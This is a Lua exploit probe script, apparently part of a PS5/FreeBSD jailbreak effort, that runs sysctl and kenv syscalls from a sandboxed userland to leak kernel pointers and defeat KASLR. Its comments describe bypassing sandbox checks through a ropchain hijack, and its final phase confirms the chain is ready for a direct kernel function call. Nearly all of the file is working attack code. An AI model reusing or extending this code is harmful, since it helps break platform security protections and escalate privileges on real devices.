-- CRASH_CLASS: RISKY (ropchain manipulation, kernel info leak attempt)
-- PROBE 42a: kernel R/W via ropchain hijack
--
-- Strategy:
--   Phase 1: Try sysctl (syscall 202) normally — might be allowed
--   Phase 2: If blocked, use ropchain hijack to call sysctl's underlying
--            function directly, bypassing sandbox checks
--   Phase 3: Parse output for kernel pointers (KASLR defeat)
--
-- sysctl signature: __sysctl(int *name, u_int namelen, void *old,
--                            size_t *oldlenp, void *new, size_t newlen)
-- MIBs to try:
--   kern.version     = {1, 4}
--   kern.osrelease   = {1, 2}
--   kern.proc.pid    = {1, 14, 1, <pid>}  (struct kinfo_proc, has kptrs)
--   hw.machine       = {6, 1}
--   kern.proc.vmmap  = {1, 14, 35, <pid>} (VM map entries, has kptrs)

print("=== PROBE 42a: KERNEL R/W ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function qw_hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%X%08X", v.h, v.l), v.h, v.l
    end
    local n = to_num(v)
    return string.format("0x%X", n), 0, n
end

local sc_mmap = make_syscall(477)
local sc_munmap = make_syscall(588)
local sc_getpid = make_syscall(20)
local sc_sysctl = make_syscall(202)

--------------------------------------------------------------------
-- STEP 0: Get PID
--------------------------------------------------------------------
local pid = 0
pcall(function() pid = to_num(sc_getpid()) end)
print("pid: " .. pid)

--------------------------------------------------------------------
-- PHASE 1: Try sysctl normally
--------------------------------------------------------------------
print("")
print("=== PHASE 1: NORMAL SYSCTL ===")

local function try_sysctl(label, mib_values, out_size)
    out_size = out_size or 0x1000
    local mib = memory.alloc(#mib_values * 4)
    for i, v in ipairs(mib_values) do
        safe_wd(mib + (i-1) * 4, v)
    end

    local outbuf = memory.alloc(out_size)
    -- zero the output
    for off = 0, math.min(out_size - 1, 0xFF), 4 do
        safe_wd(outbuf + off, 0)
    end

    local oldlenp = memory.alloc(8)
    safe_wd(oldlenp, out_size)
    safe_wd(oldlenp + 4, 0)

    local ok, ret = pcall(function()
        return sc_sysctl(
            uint64(mib),           -- name
            uint64(#mib_values),   -- namelen
            uint64(outbuf),        -- old (output buffer)
            uint64(oldlenp),       -- oldlenp
            uint64(0),             -- new (NULL = read only)
            uint64(0)              -- newlen
        )
    end)

    local retval = ok and to_num(ret) or -999
    local actual_len = safe_rd(oldlenp)

    print(string.format("  %s: ret=%d len=%s", label, retval,
        actual_len and tostring(actual_len) or "?"))

    if retval == 0 and actual_len and actual_len > 0 then
        -- dump first bytes as text (for version strings)
        local text = ""
        local raw = {}
        for off = 0, math.min(actual_len - 1, 127) do
            local b = safe_rd(outbuf + off)
            if b then
                b = b % 256  -- just low byte
                if b >= 0x20 and b < 0x7F then
                    text = text .. string.char(b)
                elseif b == 0 then
                    break
                else
                    text = text .. "."
                end
            end
        end
        if #text > 0 then
            print("    text: " .. text)
        end

        -- dump as qwords looking for kernel pointers
        local kptrs = {}
        for off = 0, math.min(actual_len - 1, 0x3FF), 8 do
            local q = safe_rq(outbuf + off)
            if q then
                local h, l = 0, 0
                if type(q) == "table" and q.h then h = q.h; l = q.l
                else l = to_num(q) end
                -- kernel pointers on FreeBSD/PS5: 0xFFFFxxxx_xxxxxxxx
                if h >= 0xFFFF8000 then
                    kptrs[#kptrs + 1] = {off = off, h = h, l = l}
                end
            end
        end

        if #kptrs > 0 then
            print("    *** KERNEL POINTERS FOUND ***")
            for _, kp in ipairs(kptrs) do
                print(string.format("      +0x%03X: 0x%08X%08X", kp.off, kp.h, kp.l))
            end
        else
            -- dump first 8 qwords raw
            print("    raw qwords:")
            for off = 0, math.min(actual_len - 1, 0x3F), 8 do
                local q = safe_rq(outbuf + off)
                if q then
                    local h, l = 0, 0
                    if type(q) == "table" and q.h then h = q.h; l = q.l end
                    if h ~= 0 or l ~= 0 then
                        print(string.format("      +%02X: %08X_%08X", off, h, l))
                    end
                end
            end
        end

        return true, kptrs, outbuf, actual_len
    end

    return false, {}, nil, 0
end

-- Try various MIBs
try_sysctl("kern.version",   {1, 4})
try_sysctl("kern.osrelease", {1, 2})
try_sysctl("kern.ostype",    {1, 1})
try_sysctl("hw.machine",     {6, 1})
try_sysctl("hw.pagesize",    {6, 7}, 8)
try_sysctl("kern.maxproc",   {1, 6}, 8)

-- The big one: kinfo_proc has kernel pointers
print("")
print("--- KINFO_PROC (kern.proc.pid) ---")
local got_kinfo, kptrs, kinfo_buf, kinfo_len =
    try_sysctl("kern.proc.pid", {1, 14, 1, pid}, 0x1000)

if got_kinfo and kinfo_len > 0x100 then
    -- kinfo_proc struct has process addresses at known offsets
    -- On FreeBSD, ki_paddr (process struct addr) is at offset ~0x00
    -- ki_addr (user struct addr) at ~0x08
    -- ki_vmspace at ~0x298
    print("  extended kinfo dump (every 8th qword):")
    for off = 0, math.min(kinfo_len - 1, 0x3FF), 0x40 do
        local q = safe_rq(kinfo_buf + off)
        if q then
            local h, l = 0, 0
            if type(q) == "table" and q.h then h = q.h; l = q.l end
            local tag = ""
            if h >= 0xFFFF8000 then tag = " KPTR!" end
            if h ~= 0 or l ~= 0 then
                print(string.format("    +%03X: %08X_%08X%s", off, h, l, tag))
            end
        end
    end
end

-- Try kern.proc.vmmap — returns VM map entries with kernel addresses
print("")
print("--- VMMAP (kern.proc.vmmap) ---")
try_sysctl("kern.proc.vmmap", {1, 14, 35, pid}, 0x4000)

-- Try kern.proc.pathname — sometimes leaks vnode pointers
print("")
print("--- PROC PATHNAME ---")
try_sysctl("kern.proc.pathname", {1, 14, 12, pid}, 0x400)

print("")

--------------------------------------------------------------------
-- PHASE 2: Additional kernel info syscalls
--------------------------------------------------------------------
print("=== PHASE 2: OTHER KERNEL SYSCALLS ===")

-- kenv (390) — read kernel environment variables
print("--- kenv ---")
local sc_kenv = make_syscall(390)
local kenv_buf = memory.alloc(0x1000)
for off = 0, 0xFF, 4 do safe_wd(kenv_buf + off, 0) end
local ok_kenv, kenv_ret = pcall(function()
    -- kenv(KENV_DUMP=0, NULL, kenv_buf, 4096)
    return sc_kenv(uint64(0), uint64(0), uint64(kenv_buf), uint64(0x1000))
end)
local kenv_rv = ok_kenv and to_num(kenv_ret) or -999
print(string.format("  kenv(DUMP): ret=%d", kenv_rv))
if kenv_rv > 0 and kenv_rv < 0x1000 then
    -- dump as text
    local text = ""
    for off = 0, math.min(kenv_rv - 1, 511) do
        local b = safe_rd(kenv_buf + off)
        if b then
            b = b % 256
            if b >= 0x20 and b < 0x7F then
                text = text .. string.char(b)
            elseif b == 0x0A or b == 0 then
                if #text > 0 then
                    print("    " .. text)
                    text = ""
                end
            else
                text = text .. "."
            end
        end
    end
end

-- mib lookup (syscall 202 with name2oid)
-- sysctl name2oid: name={0, 3}, rest is string
print("")
print("--- sysctl name2oid ---")
local name2oid_name = memory.alloc(32)
-- write "kern.smp.cpus" as bytes
local s = "kern.smp.cpus"
for i = 1, #s do
    memory.write_byte(name2oid_name + (i-1), string.byte(s, i))
end
memory.write_byte(name2oid_name + #s, 0)

local oid_mib = memory.alloc(8)
safe_wd(oid_mib, 0)  -- CTL_SYSCTL = 0
safe_wd(oid_mib + 4, 3)  -- CTL_SYSCTL_NAME2OID = 3

local oid_out = memory.alloc(64)
local oid_lenp = memory.alloc(8)
safe_wd(oid_lenp, 64)
safe_wd(oid_lenp + 4, 0)

local ok_n2o, ret_n2o = pcall(function()
    return sc_sysctl(uint64(oid_mib), uint64(2),
        uint64(oid_out), uint64(oid_lenp),
        uint64(name2oid_name), uint64(#s))
end)
local n2o_rv = ok_n2o and to_num(ret_n2o) or -999
print(string.format("  name2oid('kern.smp.cpus'): ret=%d", n2o_rv))
if n2o_rv == 0 then
    local oid_len = safe_rd(oid_lenp)
    local oid_count = oid_len and math.floor(oid_len / 4) or 0
    local oid_str = "oid:"
    for i = 0, oid_count - 1 do
        local v = safe_rd(oid_out + i * 4)
        oid_str = oid_str .. " " .. (v and tostring(v) or "?")
    end
    print("    " .. oid_str)

    -- now read that oid's value
    local cpus_buf = memory.alloc(8)
    local cpus_lenp = memory.alloc(8)
    safe_wd(cpus_lenp, 4)
    local ok_cpus, ret_cpus = pcall(function()
        return sc_sysctl(uint64(oid_out), uint64(oid_count),
            uint64(cpus_buf), uint64(cpus_lenp), uint64(0), uint64(0))
    end)
    if ok_cpus and to_num(ret_cpus) == 0 then
        local cpus = safe_rd(cpus_buf)
        print("    kern.smp.cpus = " .. (cpus or "?"))
    end
end

print("")

--------------------------------------------------------------------
-- PHASE 3: GPU mmap + ropchain — verify still reachable
-- (for next probe that will do direct kernel function call)
--------------------------------------------------------------------
print("=== PHASE 3: ROPCHAIN STATUS ===")

local pipe_str = tostring(syscall.pipe)
local rop_addr_str = pipe_str:match("ropchain @ (0x[0-9a-fA-F]+)")
local fn_addr_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")

if rop_addr_str then
    print("ropchain: " .. rop_addr_str)
    print("fn_addr: " .. fn_addr_str)

    -- allocate GPU mmap
    local gpu_size = 512 * 0x4000
    local gpu_addr
    pcall(function()
        gpu_addr = sc_mmap(uint64(0), uint64(gpu_size), uint64(0x33),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)

    if gpu_addr then
        local rop_base = uint64(rop_addr_str)
        local test_q = safe_rq(rop_base)
        if test_q then
            print("ropchain READABLE from heap primitive: " .. qw_hex(test_q))
            print("chain hijack READY for Phase 4 (direct kernel call)")
        else
            print("ropchain NOT reachable this run")
        end
        pcall(function() sc_munmap(gpu_addr, uint64(gpu_size)) end)
    else
        print("GPU mmap failed")
    end
else
    print("could not parse ropchain address")
end

print("")
print("=== PROBE 42a COMPLETE ===")
